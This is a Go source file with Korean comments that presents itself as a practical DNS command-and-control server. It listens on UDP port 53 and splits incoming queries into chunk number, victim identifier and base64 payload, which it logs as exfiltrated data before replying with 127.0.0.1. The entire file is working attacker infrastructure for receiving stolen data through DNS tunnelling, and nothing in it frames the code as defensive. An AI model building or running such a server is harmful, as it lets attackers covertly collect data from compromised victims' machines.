// 📦 Go 기반 실전형 DNS C2 서버 (main.go)
// 위치: ~/dns-c2/dnsd/main.go

package main

import (
	"fmt"
	"log"
	"net"
	"os"
	"strings"
	"time"

	"github.com/miekg/dns"
)

const (
	listenAddr = ":53"
	logPath    = "/root/dns-c2/logs/raw/dns_query.log" // 환경에 맞게 수정 가능
)

func handleRequest(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)

	for _, q := range r.Question {
		if q.Qtype == dns.TypeA {
			qname := q.Name

			// 예시 쿼리: 01.victim1.aGVsbG9jaHVuaw==.main.pintruder.com.
			parts := strings.Split(qname, ".")
			if len(parts) >= 4 {
				chunk := parts[0]
				victim := parts[1]
				b64 := parts[2]

				// 로그 기록
				saveLog(fmt.Sprintf("%s | CHUNK:%s | VICTIM:%s | B64:%s",
					time.Now().Format(time.RFC3339), chunk, victim, b64))
			}

			// 응답: 127.0.0.1
			a := &dns.A{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 0},
				A:   net.ParseIP("127.0.0.1"),
			}
			msg.Answer = append(msg.Answer, a)
		}
	}

	_ = w.WriteMsg(msg)
}

func saveLog(entry string) {
	f, err := os.OpenFile(logPath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Printf("[!] 로그 파일 열기 실패: %v", err)
		return
	}
	defer f.Close()
	f.WriteString(entry + "\n")
}

func main() {
	dns.HandleFunc(".", handleRequest)

	server := &dns.Server{Addr: listenAddr, Net: "udp"}
	fmt.Println("[+] DNS C2 서버 실행 중 (UDP 53)...")
	err := server.ListenAndServe()
	if err != nil {
		log.Fatalf("[!] DNS 서버 시작 실패: %v", err)
	}
}
